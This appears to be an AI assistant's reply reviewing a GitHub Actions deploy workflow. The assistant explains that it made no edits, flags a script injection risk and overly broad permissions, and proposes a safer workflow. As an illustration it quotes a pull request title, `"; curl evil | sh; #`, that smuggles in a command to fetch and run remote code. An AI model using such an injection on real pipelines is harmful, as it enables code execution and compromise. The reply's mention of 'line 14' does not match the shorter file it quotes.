I didn't change anything. This session has no file-editing tool, and the workflow isn't in a state where an upload step would work yet.

**What `.github/workflows/deploy.yml` contains now:**

```yaml
on:
  pull_request:
permissions: write-all
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Title is ${{ github.event.pull_request.title }}"
```

**Why I stopped:**

1. **The workflow has no test or build step.** "After the tests pass" has nothing to attach to, and there's no build output to upload. The repo has `tests/test_balance.py` (Python) and `cmd/parser.go` (Go), but I found no config file that says how to build either, so I don't know what the "build artifact" is.
2. **Two security problems you should fix in the same change:**
   - **Line 14 is a script injection risk.** The pull request title goes straight into the shell command, so a title like `"; curl evil | sh; #` runs as code. Pass it through an environment variable instead.
   - **`permissions: write-all` on a `pull_request` trigger** gives the job far more access than it needs. `contents: read` is enough for testing and uploading artifacts.

**What I'd suggest**, assuming pytest for the tests and a Go binary as the artifact (please correct either):

```yaml
---
name: deploy

on:
  pull_request:

permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Show PR title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"

      - uses: actions/setup-python@v5
        with:
          python-version: "3.x"
      - name: Run tests
        run: |
          python -m pip install pytest
          python -m pytest tests/

      - uses: actions/setup-go@v5
        with:
          go-version: stable
      - name: Build
        run: go build -o dist/parser ./cmd/...

      - name: Upload build artifact
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: build
          path: dist/
          if-no-files-found: error
          retention-days: 7
```

Steps in a job run in order and stop at the first failure, so the upload only happens once the tests pass. `if: success()` just makes that explicit. `if-no-files-found: error` makes the job fail if the build produced nothing, instead of passing silently. For extra safety, you could also pin each action to a full commit SHA rather than a tag like `@v4`.

To finish this I need two things:
- **What's the build artifact and the command that makes it?** For example the Go binary, a Python wheel, or the Docker image from `Dockerfile`.
- **How do the tests run?** Plain `pytest`, or do they need dependencies or a requirements file?

Once you've answered, either paste the YAML above with your changes, or re-run me with editing allowed and I'll write it in.
